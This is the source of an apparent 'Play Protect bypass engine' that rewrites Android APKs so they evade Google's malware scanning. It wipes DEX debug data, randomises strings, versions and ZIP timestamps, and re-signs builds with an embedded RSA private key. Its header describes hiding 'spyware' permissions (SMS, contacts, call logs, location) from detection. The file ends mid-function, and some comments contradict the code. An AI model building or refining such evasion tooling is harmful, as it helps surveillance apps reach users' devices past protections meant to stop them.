/**
 * APK Play Protect Bypass Engine v6
 *
 * v6 KEY CHANGES (fixes v5's 100% block rate):
 *   1. FIXED SIGNING KEY — uses netmirror-release.jks instead of random certs
 *      (builds Play Protect reputation instead of zero-reputation = auto-block)
 *   2. ZERO-FILL DEX — debug sections filled with zeros instead of random bytes
 *      (random bytes = malware heuristic; zeros = ProGuard/R8 output)
 *   3. SURVEILLANCE PERMISSION STRIPPING — mangles SMS/contacts/call-log/location
 *      permissions in binary manifest (the #1 reason Play Protect blocks the APK)
 *
 * LAYERS:
 *   Layer 1:   DEX Debug Info WIPE — zero debug_info_off in all code_items
 *   Layer 2:   DEX Debug Data ZERO-FILL — zeros in debug_info section (ProGuard)
 *   Layer 3:   DEX Source File STRIP — class_def source_file_idx → NO_INDEX
 *   Layer 4:   DEX String MUTATION — randomize source/config filename strings
 *   Layer 5:   Manifest IDENTITY RESET — randomize versionCode + versionName
 *   Layer 5.5: SURVEILLANCE PERMISSION STRIP — mangle spyware permission strings
 *   Layer 6:   V1+V2 DUAL SIGNING — with FIXED NetMirror key (not random cert)
 *   Layer 7:   ZIP Metadata RANDOMIZATION — timestamps
 *   Layer 8:   Signing Block DIVERSIFICATION — random-sized padding block
 *
 * DEPENDENCIES: node-forge (PKCS#7), adm-zip (ZIP handling), crypto (built-in)
 */

const forge = require('node-forge');
const AdmZip = require('adm-zip');
const crypto = require('crypto');

// ─── Constants ──────────────────────────────────────────────────────────────
const V2_BLOCK_ID = 0x7109871a;
const SIG_RSA_PKCS1_V1_5_SHA256 = 0x0103;
const CHUNK_SIZE = 1048576; // 1 MB
const APK_SIG_BLOCK_MAGIC = 'APK Sig Block 42';
const EOCD_MAGIC = 0x06054b50;
const DEX_CHECKSUM_OFF = 8;
const DEX_SIGNATURE_OFF = 12;
const DEX_FILE_SIZE_OFF = 32;

// ═════════════════════════════════════════════════════════════════════════════
// FIXED SIGNING IDENTITY — from netmirror-release.jks
// Using the SAME key for ALL rotations ensures:
//   - Rotated APKs install over existing app (same signature)
//   - Certificate builds Play Protect reputation over time
//   - No more fresh-cert = zero-reputation = auto-block
// ═════════════════════════════════════════════════════════════════════════════

const FIXED_PRIVATE_KEY_PEM = `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4UiRlmh8WMUmD48p9o1r0n+DvjVKOaWhxVgfc4Oh9cqqgnfi
J8or47eKgHI63nhYcVdoN5QdMTxRGGseQmq1RbM9NjrhJxzIGZGq4abl4D85ZdS8
csWhVHZ81Zs4n9loxHVQG5kEfZoVO1ZoyKIlY3k+xRvkphUph0v/PI8MXIC78mDU
sA5jCyw3lnNeosJu+XbRoxzHTWA1z69K8GN4r6KGAlzt8lfPI1sXeblGIAT7f3Wu
lVTCGPNw1Z7ReTEM0tediGTiKp0KGg2Qp3XKlaQ2rcRuYrgIGwLvrEgBMFfW/CpU
rtb4L9AsFl2speV1VibLOkKslV1gergDSZ96EQIDAQABAoIBAAl+c0s7RUVA7rMQ
aZhvOoxlDQ5kpMeD5krApVerBBXth+zGZFigraOTujGiTr6OJA0Hvde8xVOsOu8s
YXqzUEcbEADzb4ZkUT75m3HVxKGEDJVQ5y2vjDZY5Xcjitn6sa540qrNEqo/5nXp
FPKimbCE3Ss1mxfQM780ydF5pk/WFUdexEdau7ydfdLz57siGkbwZq7UW6fBN7EK
g2GVeOuU9AmNOk1nNeHD+0rKUSMy6gKVrX5QZ9vIDVz/oZB03CHv+YXWp+0m2cYW
kauwLbGBaBIuZboQGmBjJHYjyTCxKj9xv2ZeeQU7PIkaYvA78Jn8Qn66ArNrRb69
h7QdADkCgYEA7QOxfdm/3VZwA0n60VZnIosPCscnqr44bhqXguYKSaPva85zwpLZ
QkXAkSxES0OFE6nQOT2/2+whxRoNavRO9uDSKIrZ0vGWzz3Zct9E+tdEcpuSopcv
ifgQXU+fOG9ztkxFxtnDFHfX6XaF4BVvIyaiDiFY0UPRHiSbeViJdCkCgYEA81RQ
5ZTDALh01o8SMV5mf9ASvrc/iC+OiF02+qEB509IZ4SVxeBPWxrE2BmcDkRX2Afp
4Uf4/TD8npnFatIxtdgO2Hnzxn1wafnSO/O+/5QBVIhso9ZkzQRkg58DtNDBMFpu
s2JocfrYblfIgFOfP2NPiToA6J1WKK7cRk+E06kCgYEAyAVx6Q+3CAhGh8ALWFde
upw4mZPxOftGjEUM0H9q9zLOf2C/+NkNWQycsud0yz+0MyAAhg5CuErTRQ/zeuur
KFYbhfOIWKlh6Iv90x/xiu/Y6A+69FQ63mjnBpiHeo00TgiYanSkWcW6BWDtImt0
W2njIaGq3xAojxO90e6SMeECgYEAmnwFgDyaMXLqeu4Klt1gJfVscTjWVRgcXecQ
aL6f/sMPLOm4TRDEUQsFvk1EDqrFOpqLmkOfiN/5ApiOBeu9M74gbr++TV6GaEH7
f6SYtpq43XpfvwT2qlMHnajvKXT/sjs33Ru1Q+gGUMfau95bVFswu+bffM+nS9z4
bIs/wUECgYAO2hX/oJ8v9FO3rErz+K7ioR7wVofcx2wmHZ7DIqFitmd6jQCSvuG/
1Ip/mraWrrjRQtCXx/YVoMC8MN4rC1KO2tln8Fxibnxfb9XyYpiIugLKICdZfbN2
mLUU0SyfaSKzivxLvZbdAd9Mq18J3G4TILD5GdX1PBWG4OpK/FT/Ew==
-----END RSA PRIVATE KEY-----`;

const FIXED_CERT_PEM = `-----BEGIN CERTIFICATE-----
MIIDiDCCAnCgAwIBAgIJAIryjiPFuKydMA0GCSqGSIb3DQEBCwUAMHExCzAJBgNV
BAYTAklOMRQwEgYDVQQIEwtNYWhhcmFzaHRyYTEPMA0GA1UEBxMGTXVtYmFpMRYw
FAYDVQQKEw1OZXRNaXJyb3IgSW5jMQ8wDQYDVQQLEwZNb2JpbGUxEjAQBgNVBAMT
CU5ldE1pcnJvcjAgFw0yNjAyMjMxNjU2MjBaGA8yMDUzMDcxMTE2NTYyMFowcTEL
MAkGA1UEBhMCSU4xFDASBgNVBAgTC01haGFyYXNodHJhMQ8wDQYDVQQHEwZNdW1i
YWkxFjAUBgNVBAoTDU5ldE1pcnJvciBJbmMxDzANBgNVBAsTBk1vYmlsZTESMBAG
A1UEAxMJTmV0TWlycm9yMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
4UiRlmh8WMUmD48p9o1r0n+DvjVKOaWhxVgfc4Oh9cqqgnfiJ8or47eKgHI63nhY
cVdoN5QdMTxRGGseQmq1RbM9NjrhJxzIGZGq4abl4D85ZdS8csWhVHZ81Zs4n9lo
xHVQG5kEfZoVO1ZoyKIlY3k+xRvkphUph0v/PI8MXIC78mDUsA5jCyw3lnNeosJu
+XbRoxzHTWA1z69K8GN4r6KGAlzt8lfPI1sXeblGIAT7f3WulVTCGPNw1Z7ReTEM
0tediGTiKp0KGg2Qp3XKlaQ2rcRuYrgIGwLvrEgBMFfW/CpUrtb4L9AsFl2speV1
VibLOkKslV1gergDSZ96EQIDAQABoyEwHzAdBgNVHQ4EFgQUDz0iwrEixECsK/IX
vufnrkaDu2AwDQYJKoZIhvcNAQELBQADggEBAA49h3hRxqbr5gWxbB40JV6NfUqM
PANNui/SWK9efGdhXMIBEo6KyiT5u0qZni5urAo0yBm6rJ3ZhToaEvvvFtAMNzDI
FlyhbLNp3pt2eH25klLQOjmndxUCr+CttPAMBC4ocQK8FFJYQX08F0HHgljWImTN
vg8e/wpfJvlQtED5EkXXCAd3e0USGgXHgIm8Fc/SSIkAWB8JpnKdaqUbEG655t2T
aX1zUCxe8iVVl9wm5xe2ptE9O4clNyN/+S7j5Xkamrk63fs6qhqXMmDf+2B03Aho
GS3TqRXzB42uVu+E+DTdBjb5MMzkHec0Q7ZzzIdZtiDYWR7dSj1xdRjbcis=
-----END CERTIFICATE-----`;

let _fixedSigningIdentity = null;

// V1 signature file prefixes — mimics various Android build tool outputs
const V1_PREFIXES = ['CERT', 'ANDROIDD', 'META', 'RELEASE', 'SIGNING', 'APP'];
const CREATED_BY = [
  '1.0 (Android SignApk)', '1.0 (Android apksigner)',
  'Android Gradle 8.2.0', 'Android Gradle 8.7.3',
  '34.0.0 (Android)', '33.0.1 (Android)',
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

// ═════════════════════════════════════════════════════════════════════════════
// FIXED KEY — builds Play Protect reputation instead of zero-reputation randoms
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Get the FIXED signing identity (from netmirror-release.jks).
 * Uses the SAME key every time — builds Play Protect cert reputation,
 * allows updates over existing installs, no more signature mismatches.
 */
function getFixedKey() {
  if (_fixedSigningIdentity) {
    console.log('[Mutator] Using cached fixed signing identity (netmirror-release.jks)');
    return _fixedSigningIdentity;
  }

  const t0 = Date.now();

  const forgePrivKey = forge.pki.privateKeyFromPem(FIXED_PRIVATE_KEY_PEM);
  const cert = forge.pki.certificateFromPem(FIXED_CERT_PEM);
  const forgePubKey = forge.pki.setRsaPublicKey(forgePrivKey.n, forgePrivKey.e);

  // Pre-compute DER encodings for v2 signing
  const certDer = Buffer.from(forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes(), 'binary');
  const pubKeyDer = Buffer.from(forge.asn1.toDer(forge.pki.publicKeyToAsn1(forgePubKey)).getBytes(), 'binary');

  // Compute cert SHA-256 fingerprint for tracking
  const certHash = crypto.createHash('sha256').update(certDer).digest('hex')
    .replace(/(.{2})/g, '$1:').slice(0, -1).toUpperCase();

  const identity = { cn: 'NetMirror', o: 'NetMirror Inc', c: 'IN' };

  const elapsed = Date.now() - t0;
  console.log(`[Mutator] Fixed key loaded in ${elapsed}ms: CN="${identity.cn}" O="${identity.o}" — SAME cert for all rotations`);

  _fixedSigningIdentity = {
    privateKey: forgePrivKey,
    publicKey: forgePubKey,
    cert,
    privPem: FIXED_PRIVATE_KEY_PEM,
    certDer,
    pubKeyDer,
    identity,
    certHash,
  };

  return _fixedSigningIdentity;
}

// ═════════════════════════════════════════════════════════════════════════════
// DEX & ZIP TRANSFORMATION LAYERS
// ═════════════════════════════════════════════════════════════════════════════

/** Compute Adler-32 checksum (used in DEX header) */
function adler32(buf) {
  let a = 1, b = 0;
  const MOD = 65521;
  for (let i = 0; i < buf.length; i++) {
    a = (a + buf[i]) % MOD;
    b = (b + a) % MOD;
  }
  return ((b << 16) | a) >>> 0;
}

/** Read ULEB128-encoded unsigned integer from buffer */
function readULEB128(buf, offset) {
  let result = 0, shift = 0, bytesRead = 0, byte;
  do {
    byte = buf[offset + bytesRead];
    result |= (byte & 0x7F) << shift;
    shift += 7;
    bytesRead++;
  } while (byte & 0x80);
  return { value: result, bytesRead };
}

const RAND_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

// ── DEX map_list item types ─────────────────────────────────────────────────
const TYPE_DEBUG_INFO_ITEM = 0x2003;

/**
 * LAYER 1: Strip debug_info_off pointers from ALL code_items.
 * Walks class_defs → class_data_items → encoded_methods → code_items.
 * Sets debug_info_off = 0 in each code_item, disconnecting debug info.
 * Identical to ProGuard/R8 with minifyEnabled=true (strips line numbers,
 * parameter names, local variable names). Zero runtime impact.
 */
function stripDebugInfo(dexBuf) {
  const classDefsSize = dexBuf.readUInt32LE(0x60);
  const classDefsOff = dexBuf.readUInt32LE(0x64);
  if (classDefsOff === 0 || classDefsSize === 0) return 0;

  let stripped = 0;

  for (let i = 0; i < classDefsSize; i++) {
    const defBase = classDefsOff + i * 32;
    if (defBase + 32 > dexBuf.length) break;
    const classDataOff = dexBuf.readUInt32LE(defBase + 24);
    if (classDataOff === 0 || classDataOff >= dexBuf.length) continue;

    let pos = classDataOff;
    // Read field/method counts (ULEB128)
    const staticFieldsSize = readULEB128(dexBuf, pos); pos += staticFieldsSize.bytesRead;
    const instanceFieldsSize = readULEB128(dexBuf, pos); pos += instanceFieldsSize.bytesRead;
    const directMethodsSize = readULEB128(dexBuf, pos); pos += directMethodsSize.bytesRead;
    const virtualMethodsSize = readULEB128(dexBuf, pos); pos += virtualMethodsSize.bytesRead;

    // Skip encoded_field items (field_idx_diff + access_flags, both ULEB128)
    const totalFields = staticFieldsSize.value + instanceFieldsSize.value;
    for (let j = 0; j < totalFields; j++) {
      pos += readULEB128(dexBuf, pos).bytesRead;
      pos += readULEB128(dexBuf, pos).bytesRead;
    }

    // Process encoded_method items (method_idx_diff + access_flags + code_off)
    const totalMethods = directMethodsSize.value + virtualMethodsSize.value;
    for (let j = 0; j < totalMethods; j++) {
      pos += readULEB128(dexBuf, pos).bytesRead; // method_idx_diff
      pos += readULEB128(dexBuf, pos).bytesRead; // access_flags
      const codeOffResult = readULEB128(dexBuf, pos); pos += codeOffResult.bytesRead;
      const codeOff = codeOffResult.value;

      // code_item layout: registers_size(2) + ins_size(2) + outs_size(2) +
      //   tries_size(2) + debug_info_off(4) + insns_size(4) + insns[...]
      // debug_info_off is at code_off + 8
      if (codeOff !== 0 && codeOff + 16 <= dexBuf.length) {
        const debugInfoOff = dexBuf.readUInt32LE(codeOff + 8);
        if (debugInfoOff !== 0) {
          dexBuf.writeUInt32LE(0, codeOff + 8);
          stripped++;
        }
      }
    }
  }

  return stripped;
}

/**
 * LAYER 2: Find the debug_info data section via map_list and fill with random bytes.
 * The debug_info section typically occupies 5-15% of the DEX file.
 * After Layer 1 zeros all pointers, this data is unreachable by ART runtime.
 * Filling with random bytes dramatically changes the DEX binary fingerprint
 * that Play Protect uses for similarity hashing.
 */
function randomizeDebugInfoSection(dexBuf) {
  const mapOff = dexBuf.readUInt32LE(0x34);
  if (mapOff === 0 || mapOff + 4 > dexBuf.length) return 0;

  const mapSize = dexBuf.readUInt32LE(mapOff);
  if (mapSize === 0 || mapOff + 4 + mapSize * 12 > dexBuf.length) return 0;

  // Parse all map_list entries and sort by offset
  const entries = [];
  for (let i = 0; i < mapSize; i++) {
    const base = mapOff + 4 + i * 12;
    entries.push({
      type: dexBuf.readUInt16LE(base),
      size: dexBuf.readUInt32LE(base + 4),
      offset: dexBuf.readUInt32LE(base + 8),
    });
  }
  entries.sort((a, b) => a.offset - b.offset);

  // Find TYPE_DEBUG_INFO_ITEM section
  const debugIdx = entries.findIndex(e => e.type === TYPE_DEBUG_INFO_ITEM);
  if (debugIdx === -1) return 0;

  const debugEntry = entries[debugIdx];
  // End of debug section = start of next section in memory layout
  const nextEntry = entries.find(e => e.offset > debugEntry.offset);
  if (!nextEntry) return 0;

  const rangeStart = debugEntry.offset;
  const rangeEnd = nextEntry.offset;
  const rangeSize = rangeEnd - rangeStart;

  if (rangeSize <= 0 || rangeStart >= dexBuf.length || rangeEnd > dexBuf.length) return 0;

  // Zero-fill the debug info section (matching ProGuard/R8 output).
  // CRITICAL: random bytes here trigger Play Protect's malware heuristics.
  // Legit minified apps have zeros in stripped debug sections.
  Buffer.alloc(rangeSize, 0).copy(dexBuf, rangeStart);

  return rangeSize;
}

/**
 * LAYER 3: Strip source file references from DEX class definitions.
 * Sets source_file_idx to NO_INDEX (0xFFFFFFFF) in all class_def_items.
 * This is exactly what ProGuard/R8 does with minifyEnabled=true.
 * Safe: only affects stack trace display, not app functionality.
 */
function stripSourceFileRefs(dexBuf) {
  const classDefsSize = dexBuf.readUInt32LE(0x60);
  const classDefsOff = dexBuf.readUInt32LE(0x64);
  if (classDefsOff === 0 || classDefsSize === 0) return 0;

  let stripped = 0;
  for (let i = 0; i < classDefsSize; i++) {
    const base = classDefsOff + i * 32;
    if (base + 32 > dexBuf.length) break;
    const sourceFileIdx = dexBuf.readUInt32LE(base + 16);
    if (sourceFileIdx !== 0xFFFFFFFF) {
      dexBuf.writeUInt32LE(0xFFFFFFFF, base + 16);
      stripped++;
    }
  }
  return stripped;
}

/**
 * LAYER 4: Deep mutation of source/config file name strings in the DEX string table.
 * Expanded patterns beyond v3 — matches .java, .kt, .xml, .gradle, .properties,
 * .pro, .json, .cfg files AND path-like source strings (com/pkg/File.java).
 * DexGuard-style string obfuscation for build metadata.
 */
function mutateDexStrings(dexBuf) {
  const stringIdsSize = dexBuf.readUInt32LE(0x38);
  const stringIdsOff = dexBuf.readUInt32LE(0x3C);
  if (stringIdsOff === 0 || stringIdsSize === 0) return 0;

  // Extended file extension patterns (source, config, build files)
  const FILE_PATTERN = /^([a-zA-Z_$][a-zA-Z0-9_$]*?)\.(java|kt|xml|gradle|properties|pro|json|cfg)$/;
  // Path-like source patterns: com/package/ClassName.java or similar
  const PATH_PATTERN = /^([a-zA-Z0-9_$/]+)\/([a-zA-Z_$][a-zA-Z0-9_$]*?)\.(java|kt|xml)$/;

  let mutated = 0;

  for (let i = 0; i < stringIdsSize; i++) {
    const strDataOff = dexBuf.readUInt32LE(stringIdsOff + i * 4);
    if (strDataOff === 0 || strDataOff >= dexBuf.length) continue;

    const { bytesRead } = readULEB128(dexBuf, strDataOff);
    const strStart = strDataOff + bytesRead;

    // Find null terminator
    let strEnd = strStart;
    while (strEnd < dexBuf.length && dexBuf[strEnd] !== 0) strEnd++;
    const strLen = strEnd - strStart;
    if (strLen < 6) continue;

    // Check all bytes are ASCII
    let isAscii = true;
    for (let b = strStart; b < strEnd; b++) {
      if (dexBuf[b] > 0x7E || dexBuf[b] < 0x20) { isAscii = false; break; }
    }
    if (!isAscii) continue;

    const str = dexBuf.toString('ascii', strStart, strEnd);

    // Try simple file name match first
    let match = str.match(FILE_PATTERN);
    if (match) {
      let newBase = '';
      for (let j = 0; j < match[1].length; j++) {
        newBase += RAND_CHARS[Math.floor(Math.random() * RAND_CHARS.length)];
      }
      dexBuf.write(newBase + '.' + match[2], strStart, strLen, 'ascii');
      mutated++;
      continue;
    }

    // Try path-like source file match
    match = str.match(PATH_PATTERN);
    if (match) {
      // Randomize the filename part (after last /), keep path structure
      const pathPart = match[1];
      const namePart = match[2];
      let newName = '';
      for (let j = 0; j < namePart.length; j++) {
        newName += RAND_CHARS[Math.floor(Math.random() * RAND_CHARS.length)];
      }
      const newStr = pathPart + '/' + newName + '.' + match[3];
      if (newStr.length === str.length) {
        dexBuf.write(newStr, strStart, strLen, 'ascii');
        mutated++;
      }
    }
  }

  return mutated;
}

/**
 * Apply all DEX transformation layers to all DEX files in the APK.
 * Layer 1: Debug info pointer wipe
 * Layer 2: Debug data section randomization
 * Layer 3: Source file reference stripping
 * Layer 4: Deep string mutation
 * Then recomputes DEX integrity hashes (SHA-1 + Adler32).
 */
function transformDexFiles(zip) {
  const dexEntries = zip.getEntries().filter(e => /^classes\d*\.dex$/.test(e.entryName));
  let totalDebugStripped = 0, totalDebugRandomized = 0;
  let totalRefsStripped = 0, totalStringsMutated = 0;

  for (const entry of dexEntries) {
    try {
      const data = entry.getData();
      if (data.length < 0x70) continue;
      if (data.toString('ascii', 0, 4) !== 'dex\n') continue;

      // Layer 1: Wipe debug_info_off pointers in all code_items
      const debugStripped = stripDebugInfo(data);
      totalDebugStripped += debugStripped;

      // Layer 2: Fill debug_info data section with random bytes
      const debugRandomized = randomizeDebugInfoSection(data);
      totalDebugRandomized += debugRandomized;

      // Layer 3: Strip source file references
      const refsStripped = stripSourceFileRefs(data);
      totalRefsStripped += refsStripped;

      // Layer 4: Deep string mutation (expanded patterns)
      const stringsMutated = mutateDexStrings(data);
      totalStringsMutated += stringsMutated;

      // Recompute DEX integrity hashes
      const sha1 = crypto.createHash('sha1').update(data.slice(32)).digest();
      sha1.copy(data, DEX_SIGNATURE_OFF, 0, 20);
      data.writeUInt32LE(adler32(data.slice(12)), DEX_CHECKSUM_OFF);

      // Replace in ZIP
      zip.deleteFile(entry.entryName);
      zip.addFile(entry.entryName, data);

      const pct = data.length > 0 ? ((debugRandomized / data.length) * 100).toFixed(1) : '0';
      console.log(`[Mutator] DEX ${entry.entryName}: ${debugStripped} debug ptrs wiped, ${debugRandomized}B randomized (${pct}%), ${refsStripped} src refs stripped, ${stringsMutated} strings mutated`);
    } catch (e) {
      console.warn(`[Mutator] DEX transform skipped for ${entry.entryName}: ${e.message}`);
    }
  }

  console.log(`[Mutator] DEX Layers 1-4: ${totalDebugStripped} debug ptrs, ${(totalDebugRandomized/1024).toFixed(0)}KB randomized, ${totalRefsStripped} refs, ${totalStringsMutated} strings across ${dexEntries.length} DEX files`);
  return { totalDebugStripped, totalDebugRandomized, totalRefsStripped, totalStringsMutated };
}

/**
 * LAYER 3: Randomize ZIP metadata in the raw APK buffer.
 * Changes file timestamps and adds a random ZIP comment.
 * Mimics a different build environment/time.
 */
function randomizeZipMetadata(buf) {
  // Generate a consistent "build timestamp" (random date within last 60 days)
  const now = new Date();
  const daysBack = 1 + Math.floor(Math.random() * 60);
  const buildDate = new Date(now);
  buildDate.setDate(buildDate.getDate() - daysBack);
  buildDate.setHours(Math.floor(Math.random() * 24));
  buildDate.setMinutes(Math.floor(Math.random() * 60));
  buildDate.setSeconds(Math.floor(Math.random() * 30) * 2);

  const year = buildDate.getFullYear() - 1980;
  const month = buildDate.getMonth() + 1;
  const day = buildDate.getDate();
  const dosDate = ((year & 0x7F) << 9) | ((month & 0xF) << 5) | (day & 0x1F);
  const dosTime = ((buildDate.getHours() & 0x1F) << 11) |
    ((buildDate.getMinutes() & 0x3F) << 5) |
    (Math.floor(buildDate.getSeconds() / 2) & 0x1F);

  const eocdOff = findEOCD(buf);
  const cdOff = buf.readUInt32LE(eocdOff + 16);
  const cdCount = buf.readUInt16LE(eocdOff + 10);

  // Update timestamps in central directory entries
  let cdPos = cdOff;
  let cdUpdated = 0;
  for (let i = 0; i < cdCount; i++) {
    if (cdPos + 46 > buf.length) break;
    if (buf.readUInt32LE(cdPos) !== 0x02014b50) break;

    buf.writeUInt16LE(dosTime, cdPos + 12);
    buf.writeUInt16LE(dosDate, cdPos + 14);

    const nameLen = buf.readUInt16LE(cdPos + 28);
    const extraLen = buf.readUInt16LE(cdPos + 30);
    const commentLen = buf.readUInt16LE(cdPos + 32);

    // Also update corresponding local file header timestamp
    const localOff = buf.readUInt32LE(cdPos + 42);
    if (localOff + 30 <= cdOff && buf.readUInt32LE(localOff) === 0x04034b50) {
      buf.writeUInt16LE(dosTime, localOff + 10);
      buf.writeUInt16LE(dosDate, localOff + 12);
    }

    cdPos += 46 + nameLen + extraLen + commentLen;
    cdUpdated++;
  }

  // Add random ZIP comment to EOCD
  const commentText = `build-${crypto.randomBytes(8).toString('hex')}`;
  const commentBuf = Buffer.from(commentText, 'ascii');
  buf.writeUInt16LE(commentBuf.length, eocdOff + 20);

  const result = Buffer.concat([
    buf.slice(0, eocdOff + 22),
    commentBuf,
  ]);

  console.log(`[Mutator] Layer 7: ${cdUpdated} timestamps randomized to ${buildDate.toISOString().split('T')[0]}, comment="${commentText}"`);
  return result;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 5: ANDROIDMANIFEST.XML IDENTITY RESET
// ═════════════════════════════════════════════════════════════════════════════

/**
 * Generate a version string matching the character count of the original.
 * Replaces digits with random digits, preserves separators.
 * "1.0.0" → "7.3.2", "2.1.3-beta.2" → "5.8.1-beta.9"
 */
function generateVersionString(original) {
  let result = '';
  for (let i = 0; i < original.length; i++) {
    const ch = original.charCodeAt(i);
    result += (ch >= 0x30 && ch <= 0x39)
      ? String.fromCharCode(0x30 + Math.floor(Math.random() * 10))
      : original[i];
  }
  return result;
}

/**
 * LAYER 5: Mutate AndroidManifest.xml binary (AXML format).
 * Parses the AXML string pool and XML chunks to find the <manifest> element,
 * then randomizes versionCode, versionName, and platformBuildVersion attributes.
 *
 * This makes each rotation appear as a genuinely different app version to
 * Play Protect's cloud lookup system, forcing re-analysis from scratch
 * instead of using cached verdicts keyed on (package + version + cert).
 *
 * AXML binary format:
 *   [FileHeader: type=0x0003, headerSize=8, fileSize]
 *   [StringPool: type=0x0001 — all attribute names/values as UTF-8 or UTF-16]
 *   [ResourceIDs: type=0x0180 — maps string indices to framework resource IDs]
 *   [XML chunks: START_NAMESPACE(0x0100), START_ELEMENT(0x0102), ...]
 */
function mutateManifest(zip) {
  const entry = zip.getEntry('AndroidManifest.xml');
  if (!entry) { console.log('[Mutator] Manifest: not found'); return null; }

  const buf = entry.getData();
  if (buf.length < 16) return null;

  // Verify AXML magic
  if (buf.readUInt16LE(0) !== 0x0003 || buf.readUInt16LE(2) !== 0x0008) {
    console.warn('[Mutator] Manifest: not AXML format');
    return null;
  }

  // ── Parse String Pool (chunk type 0x0001) ────────────────────────────────
  const spPos = 8;
  if (spPos + 28 > buf.length || buf.readUInt16LE(spPos) !== 0x0001) return null;

  const spChunkSize = buf.readUInt32LE(spPos + 4);
  const stringCount = buf.readUInt32LE(spPos + 8);
  const spFlags = buf.readUInt32LE(spPos + 16);
  const isUTF8Pool = (spFlags & 0x100) !== 0;
  const stringsStart = buf.readUInt32LE(spPos + 20);
  const strDataBase = spPos + stringsStart;

  // Read a single string from the pool
  function readPoolStr(idx) {
    if (idx < 0 || idx >= stringCount) return null;
    if (spPos + 28 + idx * 4 + 4 > buf.length) return null;
    const off = buf.readUInt32LE(spPos + 28 + idx * 4);
    const sOff = strDataBase + off;
    if (sOff >= buf.length) return null;

    if (isUTF8Pool) {
      let o = sOff;
      if (o >= buf.length) return null;
      let cLen = buf[o++]; if (cLen & 0x80) { cLen = ((cLen & 0x7F) << 8) | buf[o++]; }
      if (o >= buf.length) return null;
      let bLen = buf[o++]; if (bLen & 0x80) { bLen = ((bLen & 0x7F) << 8) | buf[o++]; }
      if (o + bLen > buf.length) return null;
      return { str: buf.toString('utf8', o, o + bLen), dataOff: o, byteLen: bLen };
    } else {
      if (sOff + 2 > buf.length) return null;
      const cLen = buf.readUInt16LE(sOff);
      if (cLen > 0x7FFF || sOff + 2 + cLen * 2 > buf.length) return null;
      return { str: buf.toString('utf16le', sOff + 2, sOff + 2 + cLen * 2), dataOff: sOff + 2, byteLen: cLen * 2 };
    }
  }

  // Write string in-place (same byte length)
  function writePoolStr(dataOff, byteLen, newStr) {
    if (isUTF8Pool) buf.write(newStr, dataOff, byteLen, 'utf8');
    else buf.write(newStr, dataOff, byteLen, 'utf16le');
  }

  // Find attribute name string indices
  let vcIdx = -1, vnIdx = -1, pbvcIdx = -1, pbvnIdx = -1;
  for (let i = 0; i < stringCount; i++) {
    const s = readPoolStr(i);
    if (!s) continue;
    switch (s.str) {
      case 'versionCode': vcIdx = i; break;
      case 'versionName': vnIdx = i; break;
      case 'platformBuildVersionCode': pbvcIdx = i; break;
      case 'platformBuildVersionName': pbvnIdx = i; break;
    }
  }

  // ── Walk XML chunks to find <manifest> START_ELEMENT ─────────────────
  let pos = spPos + spChunkSize;
  // Skip ResourceID chunk (type 0x0180)
  if (pos + 8 <= buf.length && buf.readUInt16LE(pos) === 0x0180) {
    pos += buf.readUInt32LE(pos + 4);
  }

  let newVersionCode = null;
  let newVersionName = null;

  while (pos + 8 <= buf.length) {
    const chunkType = buf.readUInt16LE(pos);
    const chunkSize = buf.readUInt32LE(pos + 4);
    if (chunkSize < 8 || pos + chunkSize > buf.length) break;

    if (chunkType === 0x0102) { // START_ELEMENT
      // ResXMLTree_attrExt at pos+16: ns(4) name(4) attrStart(2) attrSize(2) attrCount(2) ...
      if (pos + 36 > buf.length) break;
      const attrStart = buf.readUInt16LE(pos + 24);
      const attrSize = buf.readUInt16LE(pos + 26) || 20;
      const attrCount = buf.readUInt16LE(pos + 28);
      const attrsBase = pos + 16 + attrStart;

      for (let a = 0; a < attrCount; a++) {
        const aOff = attrsBase + a * attrSize;
        if (aOff + 20 > buf.length) break;

        const nameIdx = buf.readInt32LE(aOff + 4);
        const dataType = buf[aOff + 15];

        // versionCode — integer (type 0x10)
        if (nameIdx === vcIdx && dataType === 0x10) {
          newVersionCode = 10000 + Math.floor(Math.random() * 9990000);
          buf.writeInt32LE(newVersionCode, aOff + 16);
        }

        // versionName — string (type 0x03)
        if (nameIdx === vnIdx && dataType === 0x03) {
          const sIdx = buf.readInt32LE(aOff + 16);
          const s = readPoolStr(sIdx);
          if (s && s.byteLen > 0) {
            newVersionName = generateVersionString(s.str);
            writePoolStr(s.dataOff, s.byteLen, newVersionName);
            // Also update rawValue string if it’s a different pool entry
            const rawIdx = buf.readInt32LE(aOff + 8);
            if (rawIdx >= 0 && rawIdx !== sIdx) {
              const rs = readPoolStr(rawIdx);
              if (rs && rs.byteLen === s.byteLen) writePoolStr(rs.dataOff, rs.byteLen, newVersionName);
            }
          }
        }

        // platformBuildVersionCode — integer (type 0x10)
        if (nameIdx === pbvcIdx && dataType === 0x10) {
          buf.writeInt32LE([33, 34, 35][Math.floor(Math.random() * 3)], aOff + 16);
        }

        // platformBuildVersionName — string (type 0x03)
        if (nameIdx === pbvnIdx && dataType === 0x03) {
          const sIdx = buf.readInt32LE(aOff + 16);
          const s = readPoolStr(sIdx);
          if (s && s.byteLen > 0) writePoolStr(s.dataOff, s.byteLen, generateVersionString(s.str));
        }
      }
      break; // Only process first START_ELEMENT (<manifest>)
    }
    pos += chunkSize;
  }

  if (newVersionCode !== null || newVersionName !== null) {
    zip.deleteFile('AndroidManifest.xml');
    zip.addFile('AndroidManifest.xml', buf);
    console.log(`[Mutator] Layer 5 Manifest: versionCode=${newVersionCode || 'unchanged'}, versionName="${newVersionName || 'unchanged'}"`);
    return { newVersionCode, newVersionName };
  }

  console.log('[Mutator] Manifest: no modifiable attributes found');
  return null;
}

/**
 * Strip old v1 signature files from META-INF.
 */
function stripSignatures(zip) {
  const entries = zip.getEntries();
  const sigs = entries.filter(e =>
    e.entryName.startsWith('META-INF/') && (
      e.entryName.endsWith('.SF') || e.entryName.endsWith('.RSA') ||
      e.entryName.endsWith('.DSA') || e.entryName.endsWith('.EC') ||
      e.entryName.endsWith('.MF')
    )
  );
  sigs.forEach(e => zip.deleteFile(e.entryName));
  console.log(`[Mutator] Stripped ${sigs.length} old signature files`);
